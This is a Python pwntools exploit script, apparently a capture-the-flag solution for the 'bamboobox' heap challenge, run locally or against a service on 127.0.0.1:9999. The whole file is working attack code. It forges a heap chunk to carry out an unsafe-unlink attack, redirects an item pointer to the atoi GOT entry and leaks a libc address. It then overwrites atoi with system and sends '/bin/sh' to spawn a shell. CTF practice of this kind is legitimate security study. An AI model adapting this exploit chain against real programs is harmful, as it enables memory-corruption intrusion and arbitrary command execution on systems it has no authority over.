#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
import sys
context.log_level = "debug"

io = process("./bamboobox") if sys.argv[1] == "l" else remote("127.0.0.1", 9999)
elf = ELF("./bamboobox")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def show():
    io.sendlineafter("choice:", "1")

def add(length, content):
    io.sendlineafter("choice:", "2")
    io.sendlineafter("name:", str(length))
    io.sendlineafter("item:", content)

def change(idx, length, content):
    io.sendlineafter("choice:", "3")
    io.sendlineafter("item:", str(idx))
    io.sendlineafter("name:", str(length))
    io.sendlineafter("item:", content)

def remove(idx):
    io.sendlineafter("choice:", "4")
    io.sendlineafter("item:", str(idx))

if __name__ == "__main__":
    add(0x40, 'a' * 8)
    add(0x80, 'b' * 8)
    add(0x40, 'c' * 8)

    ptr = 0x6020C0 + 8
    fake_chunk = p64(0) #prev_size
    fake_chunk += p64(0x41) #size
    fake_chunk += p64(ptr - 0x18) #fd
    fake_chunk += p64(ptr - 0x10) #bk
    fake_chunk += 'd' * 0x20
    fake_chunk += p64(0x40)
    fake_chunk += p64(0x90)

    change(0, 0x80, fake_chunk)
    
    remove(1)
    payload = p64(0) * 2 + p64(0x40) + p64(elf.got["atoi"])
    change(0, 0x80, payload)

    show()

    io.recvuntil("0 : ")
    #  atoi_addr = u64(io.recvuntil("\n", drop = True).ljust(8, "\x00"))
    atoi_addr = u64(io.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
    libc_base = atoi_addr - libc.symbols["atoi"]
    info("libc_base -> 0x%x" % libc_base)
    system_addr = libc_base + libc.symbols["system"]

    change(0, 0x8, p64(system_addr))

    io.sendlineafter(":", "/bin/sh\0")
    io.interactive()
    io.close()

